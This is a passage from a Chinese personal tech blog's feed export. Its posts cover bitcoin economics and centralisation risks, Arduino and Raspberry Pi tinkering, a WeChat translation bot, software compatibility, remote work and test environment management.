&lt;p&gt;但是，也有人提出反对，尤其认为比特币完全不同于传统货币，they are swimming in the different sea. 传统的法定货币由信用机构发行，很难控制发行量，即使通货紧缩的理论正确，也不一定适用于比特币，比特币采用的是完全不同的一条方式。再说关于&lt;a href=&quot;http://www.forbes.com/sites/jonmatonis/2012/12/23/fear-not-deflation/&quot;&gt;通货紧缩是否一定不好&lt;/a&gt;，还有很大的分歧。例如，&lt;a href=&quot;http://www.reddit.com/r/Bitcoin/comments/1ape0f/why_krugman_is_wrong_about_deflation/&quot;&gt;这篇文章&lt;/a&gt;里对上述三个理由的反驳，就非常有道理。其他的还有stackexchange上一篇&lt;a href=&quot;http://bitcoin.stackexchange.com/questions/408/does-hoarding-really-hurt-bitcoin/414#414&quot;&gt;讨论&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;所以，通货紧缩到底对于Bitcoin来说是不是威胁，现在还很难下结论。&lt;/p&gt;

&lt;h2&gt;攻击矿池&lt;/h2&gt;

&lt;p&gt;在Satoshi Nakamoto的设计里，挖矿可以使分布式的，但是由于算力的提高，单打独斗参与挖矿似乎越来越难挖到BTC了，一种新的模式已经流行，挖矿连接到大的矿池入股参与计算，计算出新的Block得到BTC后，参与BTC分红。这样的挖矿模式无疑比原先效率更高。但是矿池和上面的交易所和银行存在一样的问题，攻击和信任。这是中心化所不可避免的，就算是现有法定货币的中心也并不完全值得信任。 如果矿池被攻击，算力可能突然下降，被51%攻击就有了可能。 3月12日比特币客户端BUG导致的事件，其实就是比特币网络自己对自己进行的一次51%攻击，矿池挖矿的客户端版本差异造成了问题的关键，解铃还须系铃人，最后大的矿池的配合和决定也成了解决问题的关键，最后甚至出现了0.7 Orphaned block chain合力追赶更长的v0.8 main chain的壮观景象。由此也可以看出，矿池的信用保证十分重要，矿池的影响力也许会对比特币网络造成重大伤害。&lt;/p&gt;

&lt;h2&gt;政府和中心化趋势&lt;/h2&gt;

&lt;p&gt;政府的态度现在还很难说，有很大的可能，政府会很不喜欢比特币，尤其是大政府。下面是一些理由。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;比特币网络对传统的货币体制构成威胁和驱逐，而政府恰恰是传统法定货币体制的最大收益者。 虽然我认为很大程度上两者会共存，但是信息充分的自由市场中，优币是会驱逐劣币的。Gresham's Law的所谓&lt;a href=&quot;http://baike.baidu.com/view/469869.htm&quot;&gt;劣币驱逐良币&lt;/a&gt;的理论是没有道理的，这个以后可能会做解释。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;比特币的匿名性，导致政府不喜欢，容易被用于非法交易中。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;比特币是P2P的，所以政府很难征税，而税收是政府的财务来源。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;很多政府存在汇率管制，并且法定货币是很多国家进行经济调控的手段。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;不过也有好消息，最近美国金融犯罪执法网络发布&lt;a href=&quot;http://www.fincen.gov/statutes_regs/guidance/html/FIN-2013-G001.html&quot;&gt;《关于公民申请管理、交换、使用虚拟货币的规定》&lt;/a&gt;，首次允许分布式P2P货币（比特币）的申请，这也许意味着通往比特币合法化的大门正式敞开。其他的一些关于各国对于比特币态度的文章可以参考这篇&lt;a href=&quot;http://www.btcman.com/bitebixinwen/20120929/772.html&quot;&gt;文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;关于中心化趋势，指的是内部的中心化，中心化以为着比特币容易被挟持和利用，上面已经提到了一些，总结如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;交易所和银行的中心化&lt;/li&gt;
&lt;li&gt;矿池的中心化&lt;/li&gt;
&lt;li&gt;开发者社区的中心化(相信3月12日事件，大家已经见识了core dev team的影响力)&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;p&gt;如果你觉得这篇文章对你有用，可以捐赠一点 BTC 给我玩玩。帐号是 &lt;strong&gt;12UhL99zFAF154ip4v9c52YAL8wWUcNXSv&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Bitcoin经济研究系列文章一，比特币介绍</title>
   <link href="http://hackfisher.github.com/blog/2013/03/bitcoin-economic-research-1"/>
   <updated>2013-03-14T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2013/03/bitcoin-economic-research-1</id>
   <content type="html">&lt;p&gt;Bitcoin，中文比特币，是一个天才的想法，一种新型的电子货币，区别于QQ币或人民币，比特币是有史以来第一种去中心化的货币，不能被任何一个政府或组织控制。Bitcoin也是一个&lt;a href=&quot;https://github.com/bitcoin/&quot;&gt;开源项目&lt;/a&gt;，在GitHub上你可以找到它的源代码，目前被超过10万人使用，并且出现了很多接受比特币支付的服务，已经有一定的影响力。世界各地的人们每天使用比特币进行价值几十万美元的交易，没有中间人，没有信用卡公司，一种刚刚兴起的从未有过的货币。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/03/bitcoin.jpg&quot; alt=&quot;Bitcoin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bitcoin是第一个完全分布式电子货币，是由像你我这样的用户组成的网络，所以没有必要需要银行或支付中介来处理交易，完全可以点对点的进行。这种权力下放是比特币的安全和自由的基础。&lt;/p&gt;

&lt;p&gt;电子邮件让我们在世界的任何地方免费发出信件，Skype的让我们在世界任何地方进行电话和视频通话。现在比特币，可以让你把钱在线给任何一个人，在世界的任何地方以很低的交易费进行交易。Bitcoin的是一个分布式的社区运行系统，任何银行或政府无法控制。也没有华尔街的银行家们通过站在你的旁边要你发送和接收款项来致富。&lt;/p&gt;

&lt;p&gt;这一篇文章只是简单的向你引荐这一新型的电子货币，并不包括详细的技术分析，关于基本的原理，云风有一篇不错的介绍&lt;a href=&quot;http://blog.codingnow.com/2011/05/bitcoin.html&quot;&gt;文章&lt;/a&gt;，我这里就不再重复了。下面的系列文章将主要包括比特币经济相关的分析和猜测。&lt;/p&gt;

&lt;p&gt;除此之外，无论其他的文章介绍的有多详细，都抵不过Satoshi Nakamoto那一篇十分经典的Paper，强烈推荐看一遍:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://bitcoin.org/bitcoin.pdf&quot;&gt;Bitcoin: A Peer-to-Peer Electronic Cash System&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;如果你觉得这篇文章对你有用，可以捐赠一点 BTC 给我玩玩。帐号是 &lt;strong&gt;12UhL99zFAF154ip4v9c52YAL8wWUcNXSv&lt;/strong&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>初识Arduino</title>
   <link href="http://hackfisher.github.com/blog/2013/01/first-meet-arduino"/>
   <updated>2013-01-01T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2013/01/first-meet-arduino</id>
   <content type="html">&lt;p&gt;偶然的机会看到公司有俱乐部在玩机器人，感觉很有意思，简单看了一下是用Arduino搭建开发的，回来就查询了一下资料，发现是个好东西，开源硬件，又可以十分方便的将各种传感器的输入输出集成起来。感觉最近硬件社区火热了不少，也许是受到移动互联网的影响，国外的Apple，国内的小米，大家似乎都开始软件硬件一起上，因为硬件，软件系统会让人耳目一新不少。&lt;/p&gt;

&lt;p&gt;所以，贴一下初次接触Arduino的一些图片。借助搜索引擎和淘宝，基本上可以买到这些入门套件，上手的难度不大。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/01/arduino1.jpg&quot; alt=&quot;Arduino1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/01/arduino2.jpg&quot; alt=&quot;Arduino2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/01/arduino3.jpg&quot; alt=&quot;Arduino3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2013/01/arduino4.jpg&quot; alt=&quot;Arduino4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;下面是一些教程和链接：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://arduino.cc/&quot;&gt;Arduino官网&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.designspark.com/jpn/knowledge-item/arduino-starter-kit-video-tutorial&quot;&gt;Arduino入门套件教程视频&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.flamingoeda.com/2008/09/04/arduino-ethernet-%E7%BD%91%E7%BB%9C%E6%89%A9%E5%B1%95%E6%9D%BF/&quot;&gt;Arduino Ethernet 网络扩展板&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>开发微信公众平台第三方自定义接口——火星人</title>
   <link href="http://hackfisher.github.com/blog/2012/11/weixin-mars-robot"/>
   <updated>2012-11-25T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/11/weixin-mars-robot</id>
   <content type="html">&lt;p&gt;周末无聊，&lt;a href=&quot;http://www.36kr.com/p/171907.html&quot;&gt;36kr&lt;/a&gt;上看到&lt;a href=&quot;http://mp.weixin.qq.com/&quot;&gt;微信公众平台&lt;/a&gt;刚推出了第三方API，所以想利用微信的API写点好玩的东西。早先曾用python给之前的公司写过一个Gtalk的订餐机器人，同事们都觉得很好玩。这次我把这个微信机器人取名为“火星人”，够火星吧~&lt;/p&gt;

&lt;p&gt;在微信手机客户端里面搜索“火星人”，或者扫描如下二维码，就可以关注“火星人”了，当然，现在做的功能还很粗糙简单啦，只有简单的中英自动翻译功能。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/uploads/2012/11/qrcode.jpg&quot; alt=&quot;火星人二维码&quot; /&gt;&lt;/p&gt;

&lt;p&gt;正好最近在学英语，有事没事可以查查，可以看到历史的单词查询，简单但实用。&lt;/p&gt;

&lt;p&gt;具体的实现是用的PHP加上百度的翻译API，微信公众平台和百度的API上面的文档Demo简单改改就可以了，这里就不给Link了。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>GUI开发的趋势变化</title>
   <link href="http://hackfisher.github.com/blog/2012/10/Trend-of-gui-devlopment"/>
   <updated>2012-10-19T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/10/Trend-of-gui-devlopment</id>
   <content type="html">&lt;p&gt;感觉GUI开发的一个趋势之一就是XML可扩展标记(Flex, eclipse e4, Apache Pivot, Web开发(HTML)，Android手机开发等等)，现在开发App程序，和开发Web程序，已经没有太大的区别
优点是效率高，可读性也好，但是Swing在这方面就差了很多，要写很多代码，虽然我们在这方面做了很多封装，效率有所改善，但是做的还不够好。&lt;/p&gt;

&lt;p&gt;高质量代码的一个特征就是简洁，可读性好，有时候为了达到这一点，甚至“笨”一点也没关系。&lt;/p&gt;

&lt;p&gt;有一个故事可能大家都知道，是这么说的：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;“唐代的诗人白居易做诗，力求通俗易懂，明白晓畅。据说他每写一诗，必对家中老妪读之，老太太能理解的就抄录，不明白的就改写。”
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;高质量的代码也应该这样，每写一段程序，都应该尽力达到这样一种要求，只要已经过了英语四级的人都应该能读懂。&lt;/p&gt;

&lt;p&gt;这是我所理解的KISS(Keep it Simple Stupid).&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>比较QQ和Excel兼容性处理的区别：数据在哪里很关键</title>
   <link href="http://hackfisher.github.com/blog/2012/10/Compare-qq-excel-compatibility"/>
   <updated>2012-10-15T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/10/Compare-qq-excel-compatibility</id>
   <content type="html">&lt;h1&gt;前言&lt;/h1&gt;

&lt;p&gt;今天登录QQ，发现提示QQ新版公布了（QQ启动页面）。下载后，不需要删掉原有程序，双击新的安装包即可将原有的先卸载掉再进行安装（安装时会体现新的功能亮点，很多软件都是如此）。聊天记录，个性设置无缝继承，兼容度非常好，界面操作习惯不变。&lt;/p&gt;

&lt;p&gt;但相对来说，Excel的升级就麻烦很多，从Excel2003升级到Excel2007，需要下载新的安装包，很多时候用户升级和下载的办法，还是购买CD或者从官网购买。在这个方面，微软落后很多了。另外，Excel这两个版本的文件格式也不一样，Excel2003是无法直接打开2007的格式文件的，除非用额外的工具插件，这导致了市面上Excel使用的一些混乱，用户界面也比较大。&lt;/p&gt;

&lt;h1&gt;比较一下QQ和Excel在兼容性上的区别&lt;/h1&gt;

&lt;h2&gt;QQ的兼容性处理&lt;/h2&gt;

&lt;p&gt;QQ的所有数据都存储在云端(除了聊天记录好像是在本地)，所以如果客户端升级有变化(比如接口变化，数据交互格式变化)，QQ可以自己直接在云端修改数据，清洗数据，所有客户端用到的服务和数据都在QQ手上，用户根本感觉不到内部数据格式的兼容性的问题。&lt;/p&gt;

&lt;h2&gt;Excel的兼容性处理&lt;/h2&gt;

&lt;p&gt;但是Excel和QQ就不太一样，Excel跟多看起来像是一个工具，做起来的.xls文件数据在用户手里，MS基本上没办法对数据进行升级，如果工具有变化(比如从Excel2003升级到Excel2007)，微软只能在Excel2007上下功夫，并且因为数据格式变化，采用了新的后缀名。Excel2003刚开始的时候也无法打开Excel2007，后来提供了工具插件，但是感觉会减缓用户升级Excel2007的步伐。&lt;/p&gt;

&lt;p&gt;Office的兼容性是做的相当好的，Excel2007基本上可以打开Excel2003文件，但这还是在基本上没有删除功能的情况下，没有提供太多二次开发接口。相信Google Doc在这个问题上会好解决的多。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>为什么不在家办公？</title>
   <link href="http://hackfisher.github.com/blog/2012/09/Why-not-work-at-home"/>
   <updated>2012-09-28T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/09/Why-not-work-at-home</id>
   <content type="html">&lt;p&gt;我每天早上坐地铁一个小时到公司，下班回家也是一个小时，也就是说，一天24小时中，有两个小时会花在路上，是上班时间的四分之一。在中国像我这样的上班族，绝对是一个庞大的数字。&lt;/p&gt;

&lt;h1&gt;那么，为什么我们不在家办公？&lt;/h1&gt;

&lt;p&gt;先说说过去为什么我们不在家办公，这种习惯由何而来？至少在过去，或者更早，比如公司组织的形态刚刚形成的时候，人们为什么没有选择分布式的在家办公方式，而是选择聚集的工作场所。&lt;/p&gt;

&lt;h2&gt;协作交流&lt;/h2&gt;

&lt;p&gt;在电话和互联网等科技到达发展之前，人们的沟通主要依赖会议，面对面交流等形式，并且很多工作需要现场的协作，包括人和人，人和机器的协作，比如实体制造业，比如运输业。而这些要求是分布式的办公无法满足的。&lt;/p&gt;

&lt;h2&gt;生产环境&lt;/h2&gt;

&lt;p&gt;如果工作需要某些特定的生产工作环境，而这些是家庭无法满足的，那么自然也无法办公，比如制造业需要用到的某些大型机器，对于公司加密信息的获取，舒适安静的工作环境，飞行员自然无法在家里办公。&lt;/p&gt;

&lt;h2&gt;控制和信任&lt;/h2&gt;

&lt;p&gt;传统的公司管理方式，更倾向于把公司当做机器来运行，而不是当做一个人类组织来看待，而过去的机器主要是本地化的集中式的，只是在互联网出现之后，才出现了分布式的机器。另外与控制相对应的是信任的要求，在家办公的方式缺乏有效的建立信任的方式，相互的信任关系很容易被没有约束和员工动力所替代，这对于控制型经理人是无法接受的，他们习惯于一切按照控制一部机器的方式运行一个公司，就像开一部车一样。在家办公在控制型经理人眼里等同于放羊，另外很重要的是，很多信息他们无法获取，进而也无法改进生产。&lt;/p&gt;

&lt;h2&gt;承诺投入的难度&lt;/h2&gt;

&lt;p&gt;家是个人的场所，受个人的控制，个人的活动的灵活性可以得到极大释放，在家办公，等于在物理环境上，给个人以自由的办公，这样，个人的投入是难以被衡量和控制的。这样，对于某些类型的工作来说，契约的履行是难以被确认的，进而导致这种契约在实际中不完整，不具现实意义，这种契约自然无法生存。&lt;/p&gt;

&lt;p&gt;所以，解决这个问题的一个关键点，在于如何实现契约的确认，包括绩效体系。很多工种其实已经没有这个问题了，比如销售，再比如现在很多中小公司的分支办事处，作家等等。但很多白领上班族，知识工作者，按时计算报酬的，这方面还存在难点。&lt;/p&gt;

&lt;h1&gt;在家办公的好处和新趋势&lt;/h1&gt;

&lt;h2&gt;云桌面和云办公&lt;/h2&gt;

&lt;p&gt;比如Citrix正在不遗余力的推广的一些“在家办公”方案，正是基于他们开发的以套云计算服务，和云桌面等工具。&lt;/p&gt;

&lt;h2&gt;公司的一些实践&lt;/h2&gt;

&lt;p&gt;国内公司的一些实践，比如 &lt;a href=&quot;http://tech.sina.com.cn/i/2012-09-28/00507664080.shtml&quot;&gt;携程尝试宅办公兴趣浓厚：称员工业绩显著上升&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;霍桑效应&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://baike.baidu.com/view/41330.htm&quot;&gt;霍桑效应&lt;/a&gt;的一些结论&lt;/p&gt;

&lt;p&gt;以前的管理把人假设为“经济人”，认为金钱是刺激积极性的唯一动力；霍桑实验证明人是“社会人”，是复杂的社会关系的成员，因此，要调动工人的生产积极性，还必须从社会、心理方面去努力。&lt;/p&gt;

&lt;p&gt;以前的管理认为生产效率主要受工作方法和工作条件的制约，霍桑实验证实了工作效率主要取决于职工的积极性，取决于职工的家庭和社会生活及组织中人与人的关系。&lt;/p&gt;

&lt;p&gt;以前的管理对工人的思想感情漠不关心，管理人员单凭自己个人的复杂性和嗜好进行工作，而“霍桑实验”证明，管理人员，尤其是基层管理人员应像霍桑实验人员那样重视人际关系，设身处地地关心下属，通过积极的意见交流，达到感情的上下沟通。&lt;/p&gt;

&lt;h2&gt;节省时间，更多休息，提高效率&lt;/h2&gt;

&lt;p&gt;上下班的时间节省了，有了更多的时间休息，工作满意度更高，效率更高，离职率更低，这些应该很容易理解&lt;/p&gt;

&lt;h2&gt;从系统和社会角度，缓解交通压力&lt;/h2&gt;

&lt;p&gt;这些天央视播出的纪录片&lt;a href=&quot;http://baike.baidu.com/view/3399494.htm&quot;&gt;超级工程&lt;/a&gt;，里面提到了北京超复杂的地铁网络，以及人们为建立这种地铁网络付出的很多努力和代价，工程上面确实叹为观止。但这些最终的目的还是为了解决北京的交通拥挤。我当时看纪录片时就在想，解决交通问题，工程上需要付出巨大的努力，但如果从社会和体制角度解决，也许能四两拨千斤，发挥意想不到的效果，又能解决的更彻底。也许“宅办公”的发展，比北京地铁网络更有效，也说不准。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>给Raspberry Pi打印一个盒子</title>
   <link href="http://hackfisher.github.com/blog/2012/08/RaspberryPi-Print-out-Case"/>
   <updated>2012-08-25T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/08/RaspberryPi-Print-out-Case</id>
   <content type="html">&lt;p&gt;Raspberry Pi到手后，在摆弄的过程中，发现电路板很容易扎手，又担心把它给弄坏了，所以一直琢磨着怎么给它制作一个盒子。在网上搜了一遍，发现竟然有用&lt;a href=&quot;http://www.infzm.com/content/79453&quot;&gt;3D打印机&lt;/a&gt;就可以根据软件3D模型，给Raspberry Pi打印出一个盒子，国外有人已经这么做了。如果你有一台&lt;a href=&quot;http://www.mbot3d.cn/&quot;&gt;3D打印机&lt;/a&gt;，你甚至可以在家就&lt;a href=&quot;http://www.geek.com/articles/chips/raspberry-pi-gets-a-case-you-can-download-and-3d-print-2012035/&quot;&gt;下载和3D打印&lt;/a&gt;出来这个盒子，也有人打印出来&lt;a href=&quot;https://www.modmypi.com/shop/raspberry-pi-cases&quot;&gt;出售&lt;/a&gt;这些盒子。 可惜现在个人3D打印机的价格还是太贵了点，家里暂时也没有3D打印机，我只好另寻他法。&lt;/p&gt;

&lt;p&gt;后来，在网上寻到一张1：1的设计PDF图纸，可以直接下载下来，很方便的用打印机打印，然后裁剪，制作树莓派盒子，这正是我要找的:&lt;/p&gt;

&lt;p&gt;设计图纸大概
&lt;img src=&quot;/uploads/2012/08/case/raspberry-pi-print.jpg&quot; alt=&quot;设计图纸&quot; /&gt;&lt;/p&gt;

&lt;p&gt;首先将&lt;a href=&quot;http://squareitround.co.uk/Resources/Punnet_net_Alpha3.pdf&quot;&gt;设计图纸的PDF&lt;/a&gt;下载下来，打印。&lt;/p&gt;

&lt;p&gt;下面我们开始制作, 首先是从包装盒取出树莓派
&lt;img src=&quot;/uploads/2012/08/case/raspberry-pi-case-1.jpg&quot; alt=&quot;RaspberryPi包装&quot; /&gt;&lt;/p&gt;

&lt;p&gt;剪切，并找一张硬纸(比如鞋盒)，按照设计图纸进行剪切
&lt;img src=&quot;/uploads/2012/08/case/raspberry-pi-case-2.jpg&quot; alt=&quot;Case剪切&quot; /&gt;&lt;/p&gt;

&lt;p&gt;剪切完成
&lt;img src=&quot;/uploads/2012/08/case/raspberry-pi-case-3.jpg&quot; alt=&quot;剪切完成&quot; /&gt;&lt;/p&gt;

&lt;p&gt;折叠
&lt;img src=&quot;/uploads/2012/08/case/raspberry-pi-case-4.jpg&quot; alt=&quot;折叠&quot; /&gt;&lt;/p&gt;

&lt;p&gt;制作完成，将Raspberry Pi放入制作好的盒子，怎么样，是不是很方便。
&lt;img src=&quot;/uploads/2012/08/case/raspberry-pi-case-5.jpg&quot; alt=&quot;制作完成&quot; /&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Raspberry Pi第一印象</title>
   <link href="http://hackfisher.github.com/blog/2012/08/RaspberryPI-first-impress"/>
   <updated>2012-08-24T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/08/RaspberryPI-first-impress</id>
   <content type="html">&lt;p&gt;现在移动互联网正处在大爆发的时候，各种iphone和Android智能手机充斥大街，对于IT宅男来说，仅仅知道如何开发移动应用已经无法满足他们的好奇心了，他们还关心一个移动终端是如何被造出来的，除了手机之外是否还存在其他的可能性。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.raspberrypi.org/&quot;&gt;Raspberry Pi&lt;/a&gt;算是我们听到的第一个好消息，这款迷你电脑所能运行的系统已经堪称强大，价格便宜门槛低，提供各种DIY的接口，最关键的是它只有信用卡大小，满足你对于手机无法满足的移动设备需要的无线幻想，还有自己DIY学习创造的乐趣。&lt;/p&gt;

&lt;p&gt;虽然RaspberryPI定位的目标小孩(教育产业)，还有业余爱好者和热心 DIY 的科技迷，但我觉得它的出现意味深长，也许预示着下面一轮移动设备种类的大爆炸。想想吧，手机只是众多移动设备中的一个。&lt;/p&gt;

&lt;p&gt;国内用户可以再&lt;a href=&quot;http://cn.element14.com/jsp/search/productdetail.jsp?id=2081185&amp;amp;Ntt=2081185?ICID=ap-rpi-hwb&quot;&gt;elment14&lt;/a&gt;上买到，价格比国外贵，因为要多个税和路费，三百多。下面我们来看看对Raspberry Pi的第一印象。&lt;/p&gt;

&lt;p&gt;打开包装盒，插上鼠标、键盘、显示器、网卡、电源等等，树莓派的各个接口
&lt;img src=&quot;/uploads/2012/08/raspberry-pi-0.jpg&quot; alt=&quot;Raspberry Pi的接口&quot; /&gt;&lt;/p&gt;

&lt;p&gt;反面可以看到指示灯，还有Raspberry Pi的各个组件，什么CPU，主板啊等等，隐藏的细节被暴露
&lt;img src=&quot;/uploads/2012/08/raspberry-pi-1.jpg&quot; alt=&quot;Raspberry Pi组件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;插上电源，系统自动启动，制作系统SDCard的教程可以查看&lt;a href=&quot;http://www.raspberrypi.org/quick-start-guide&quot;&gt;官网Quick start guide&lt;/a&gt;，我这里用的是Raspian “wheezy” 镜像，可以看到包含python, gcc，还有一些实例程序。
&lt;img src=&quot;/uploads/2012/08/raspberry-pi-2.jpg&quot; alt=&quot;Raspberry Pi系统&quot; /&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>求两个整数数组交集的更快算法</title>
   <link href="http://hackfisher.github.com/blog/2012/05/algorithm-about-intersect-of-two-arrays"/>
   <updated>2012-05-15T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/05/algorithm-about-intersect-of-two-arrays</id>
   <content type="html">&lt;p&gt;今天在工作中遇到的一个问题，求两个整数数组的交集。一种方案是对其中一个排序，然后对另外一个数组循环，在已经排好序的数组中binarySearch，如果存在，就加到结果集中。下面给出另一种实现，感觉跟归并排序里的思想有点类似：&lt;/p&gt;

&lt;script src='https://gist.github.com/2698628.js?file=ArrayIntersect.java'&gt;&lt;/script&gt;


&lt;p&gt;&lt;noscript&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;You are being &amp;lt;a href=&amp;quot;https://gist.github.com/HackFisher/2698628/raw/ArrayIntersect.java&amp;quot;&amp;gt;redirected&amp;lt;/a&amp;gt;.&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/noscript&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>测试思考系列[6]：测试环境和配置管理自动化</title>
   <link href="http://hackfisher.github.com/blog/2012/04/thinking-in-test-environment-and-config-automation"/>
   <updated>2012-04-17T00:00:00+08:00</updated>
   <id>http://hackfisher.github.com/blog/2012/04/thinking-in-test-environment-and-config-automation</id>
   <content type="html">&lt;p&gt;不同角色之间的划分往往有助于在角色的冲突中将问题暴露，实现透明，最终改进和保证质量。任何的软件开发团队都离不开两个基本角色：开发与测试。你可以没有项目经理，可以没有架构师，也可以没有设计师；但是不能没有开发，否则没有人可以帮你实现产品；也不能没有测试，否则没有人可以决定你的产品是否能够交付。这就好像你往杯子里面倒水必须要用眼睛看着，没有眼睛反馈的信息，你永远不知道何时该停下来，也不知道停在那里；我们不希望水太少，更不希望水溢出来。眼睛与手的反馈循环就是我们实现倒水这一动作高质量的必要系统，而开发和测试的有效循环就是我们实现高质量软件的必须环节。&lt;/p&gt;

&lt;p&gt;但是开发和测试本身的角色的局限性造成了他们往往没有办法有效地形成循环，比如我们经常会听到这样的抱怨：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;测试：这个软件需要的环境太复杂，没有办法为每种情况都创建测试环境.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;测试：我没有办法保证测试的一致性，因为环境在不停地变化，恢复到原来的状态很麻烦.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;开发：你是怎么测出这个Bug的，我怎么没法重现？测试：我忘记步骤了.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;其实这些问题都和测试人员本身的定位有关系，测试人员的首要目标是发现软件中的问题，要做到这一点他们往往专注于软件的反应而忽视了造成这种响应的原因，如：硬件软件环境，系统配置情况，操作一致性等等；测试用例失败有几种原因：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;功能缺陷BUG.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;测试用例本身写的有问题(ST或者ET脚本问题).&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;测试环境有问题.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;而这些正是开发人员修复Bug最需要的内容。但是测试人员不关心，或者没有更多的精力来关心这些内容，造成了非常多的“不可重现”的Bug的出现。&lt;/p&gt;

&lt;p&gt;我们可以通过持续集成以及对代码进行版本管理控制来定位变更和导致功能缺陷的原因，同样的，我们也可以对测试环境的变更进行控制和版本管理。之前提到过持续集成要求对&lt;strong&gt;一切进行版本管理&lt;/strong&gt;，其中也包括测试环境。&lt;/p&gt;

&lt;p&gt;初看上去，测试环境的管理是一个非常复杂的问题，之前是否遇到过下面一类问题?&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&quot;要测一个什么东西，需要什么软件，然后手动安装一遍，结果发现另外一个机器上其实已经有这个软件了。&quot; ——测试环境的复用和共享问题。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&quot;有一个测试用例失败了，可是之前测试的时候一直通过的，开发人员在开发环境下测试也没有问题，测试人员费了九牛二虎之力，借助开发人员的调试帮助，结果发现是测试环境中的一个配置参数改变了。 此时，另外一个测试人员冒了一句，我之前测试另外一个问题的时候将这个参数改掉了。&quot; ——测试人员花了大量时间确定环境变更，测试环境的变更控制问题。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&quot;有一个机器，你也在里面装个东西，我也在里面装个东西，结果这个机器的环境越来越乱，桌面上乱起八糟，最后谁也不记得机器里面的一些文件有什么用处了，当初是因为什么原因使用的，又不敢删除，怕其他人有用，可是又不知道会是谁。&quot; 测试环境的管理和记录问题，好一些的会渐渐使用一些文档进行记录并共享，但是还是经常出现问题，毕竟文档也会过期。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&quot;一个测试MM突然大喊, 谁把我的模板和数据删除啦，给我出来!!! 四周鸦雀无声。我小声的问一句，你上传到svn上了吗，上次不是说过一切都要版本控制吗？&quot; 测试环境和数据的备份和删除，广义上说这个也属于变更。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&quot;我这里需要再安装针对ubuntu和suse操作系统的测试，并且需要32位和64位都有，而且还要设置一大堆配置。可是现有的5台机器都安装满了，总不能重装来重装去的吧，每次重装都要了我的老命了...&quot; 测试硬件资源的利用，和环境管理的效率问题。自动配置技术和利用虚拟化技术解决，测试环境数据化，配置化，然后才能版本控制和管理。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;开发人员: &quot;我在自己机器上测试了没问题啊&quot;， 测试人员：&quot;可我在测试环境下面就是有问题啊。&quot; 统一的测试环境问题。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;


